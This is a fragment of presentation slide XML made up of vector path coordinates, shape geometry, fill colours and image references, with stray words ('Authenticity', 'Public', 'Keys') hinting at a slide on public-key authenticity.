                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="396011" y="208762"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="394703" y="206044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="392760" y="203161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387578" y="197065"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="386511" y="196088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384721" y="194424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="375259" y="187604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="369036" y="185534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="356806" y="186385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="351917" y="189141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="345617" y="197878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="344322" y="201726"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="344347" y="203161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="344462" y="209715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="355727" y="225171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="357060" y="226656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="360565" y="230809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362000" y="233299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362648" y="236702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362762" y="237324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362191" y="239268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362140" y="239458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="359232" y="243484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="358038" y="244602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="355244" y="245821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="351802" y="245821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="329577" y="220738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="329082" y="220383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="321424" y="231000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="322745" y="233680"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="324675" y="236702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="353453" y="256044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="358571" y="255676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="359384" y="255676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362356" y="254762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367195" y="251917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="369506" y="249872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="372427" y="245821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374116" y="243484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374497" y="242506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="375488" y="239458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="375373" y="237324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="375107" y="234289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="375018" y="233299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374929" y="232371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374840" y="231432"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="372960" y="227444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367995" y="221576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="366471" y="219862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363512" y="216649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="362204" y="215163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="356654" y="204520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="357301" y="202311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="360908" y="197307"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363397" y="196088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="369570" y="196545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="388112" y="218224"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="388200" y="218541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="388696" y="218897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="396011" y="208762"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="484530" y="268566"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="483362" y="267728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="472732" y="260070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433311" y="267728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="466394" y="221843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="456920" y="215011"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="400583" y="293154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="400469" y="293306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="409956" y="300139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="426872" y="276656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433298" y="275755"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433501" y="281673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433590" y="284416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433705" y="287909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433793" y="290423"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433844" y="292087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433959" y="295440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434086" y="299110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434200" y="302310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434289" y="305181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434390" y="307911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434505" y="311492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434632" y="315226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434733" y="317995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="447141" y="326948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="444550" y="276656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="444512" y="275755"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="444487" y="275374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="484530" y="268566"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="526910" y="309499"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="518972" y="291299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518096" y="290423"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="516089" y="288988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="516089" y="309499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="515772" y="311492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514197" y="315950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512914" y="318363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="511149" y="320967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="491274" y="306628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="481279" y="299415"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="483184" y="297192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="496036" y="291299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="498843" y="291299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="516089" y="309499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="516089" y="288988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514604" y="287909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="508698" y="284416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="502869" y="282422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="503415" y="282422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="496354" y="281673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="489915" y="282422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="483590" y="284556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="458965" y="317995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="458889" y="318363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="458774" y="320979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="458927" y="325158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="458952" y="325856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="487794" y="355206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="497078" y="357632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="504507" y="347319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="503961" y="346925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="499186" y="346925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="495871" y="346430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="469442" y="319341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="471347" y="313232"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="471703" y="312699"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="476072" y="306628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="515124" y="334772"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="522046" y="325158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="524243" y="320979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="526567" y="313232"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="526910" y="309499"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="589775" y="344449"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="579920" y="337337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="534581" y="367982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="549236" y="315226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="539089" y="307911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="520992" y="376059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="494030" y="392214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="504151" y="399516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553186" y="367982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="589775" y="34444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0" name="object 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2998800" y="3962519"/>
              <a:ext cx="3097080" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3097080"/>
                <a:gd name="textAreaRight" fmla="*/ 3097440 w 3097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097529" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3097210" y="0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1" name="object 22"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2970360" y="3890880"/>
              <a:ext cx="142560" cy="14256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142875" h="142875" fill="norm" stroke="1" extrusionOk="0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6540234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332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Authenticity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Public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Keys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25699261" name="object 24"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6025680" y="2821680"/>
            <a:ext cx="710280" cy="981000"/>
            <a:chOff x="6025680" y="2821680"/>
            <a:chExt cx="710280" cy="981000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="454" name="object 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6581520" y="3215519"/>
              <a:ext cx="136080" cy="36612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366120"/>
                <a:gd name="textAreaBottom" fmla="*/ 366480 h 366120"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="136525" h="366395" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="68028" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="29371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7390" y="358604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108665" y="365906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125601" y="285243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77487" y="192965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136414" y="84628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134703" y="29371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68028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5" name="object 26"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6041160" y="2965320"/>
              <a:ext cx="545760" cy="83736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837360"/>
                <a:gd name="textAreaBottom" fmla="*/ 837720 h 837360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="546100" h="837564" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="487631" y="104923"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="241654" y="104923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241654" y="191148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="187972" y="191148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143802" y="222263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158501" y="277957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245537" y="281369"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245537" y="524358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330396" y="555364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="332124" y="837189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542151" y="837189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="546023" y="248113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="536924" y="182145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="487631" y="104923"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="546100" h="837564" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="81446" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="91926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53244" y="161851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119919" y="154480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152911" y="104923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="487631" y="104923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="481512" y="95338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="355912" y="36668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186267" y="29371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81446" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="E59EB2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6" name="object 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6089400" y="3488040"/>
              <a:ext cx="289800" cy="111960"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 289800"/>
                <a:gd name="textAreaRight" fmla="*/ 290160 w 28980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290195" h="112395" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="215595" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="121626" y="12889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="71561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125147" y="112119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228588" y="110406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="289674" y="77240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269312" y="25417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="215595" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="A6FF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57" name="object 28"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId11"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6037560" y="2944080"/>
              <a:ext cx="184680" cy="183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58" name="object 29"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId12"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6298560" y="3111120"/>
              <a:ext cx="184680" cy="183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59" name="object 30"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6025680" y="2926800"/>
              <a:ext cx="710280" cy="875879"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 710280"/>
                <a:gd name="textAreaRight" fmla="*/ 710640 w 71028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710565" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="117741" y="112229"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="111277" y="96723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95669" y="90220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80530" y="96723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73596" y="112229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80530" y="127368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95669" y="134226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111277" y="127368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117741" y="112229"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710565" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="370662" y="506183"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="363728" y="491109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348589" y="485089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333006" y="491109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326504" y="506183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333006" y="521766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348589" y="528256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363728" y="521766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370662" y="506183"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710565" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="370662" y="438505"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="363728" y="422897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348589" y="416509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333006" y="422897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326504" y="438505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333006" y="454012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348589" y="460463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363728" y="454012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370662" y="438505"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710565" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="370662" y="277088"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="363728" y="261581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348589" y="255092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333006" y="261581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326504" y="277088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333006" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348589" y="299059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363728" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370662" y="277088"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710565" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="710082" y="327558"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="707809" y="322872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="702335" y="311581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="691070" y="298259"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="676287" y="287439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670255" y="285394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670255" y="376313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="662419" y="408292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="654215" y="426415"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="643407" y="444969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="629526" y="464794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="612673" y="485089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="645566" y="542861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="650341" y="597649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="642505" y="617575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="627811" y="629653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="606640" y="631355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582307" y="621563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582307" y="332447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="606640" y="323672"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="635660" y="322872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="655929" y="332308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="668096" y="350431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670255" y="376313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670255" y="285394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="640791" y="275348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="598347" y="277520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="580936" y="285127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="580148" y="268884"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572846" y="230035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="546811" y="165773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="506628" y="117817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="454647" y="84201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="393547" y="62191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326504" y="50139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184048" y="45351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183388" y="44919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157657" y="28067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="133350" y="15621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91782" y="914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58026" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="32080" y="9956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13855" y="28943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3048" y="54356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="115633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7366" y="147193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27724" y="189014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58902" y="217512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84848" y="225247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114325" y="221361"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="146773" y="203720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170954" y="180809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="182270" y="170091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="170091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="217906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198742" y="220560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164960" y="233883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="253822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138099" y="277088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142011" y="300761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142087" y="301231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155524" y="321487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165430" y="330174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176682" y="336626"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="205244" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="550887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="225132" y="551954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="556818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="587413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="658456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167576" y="646506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167576" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
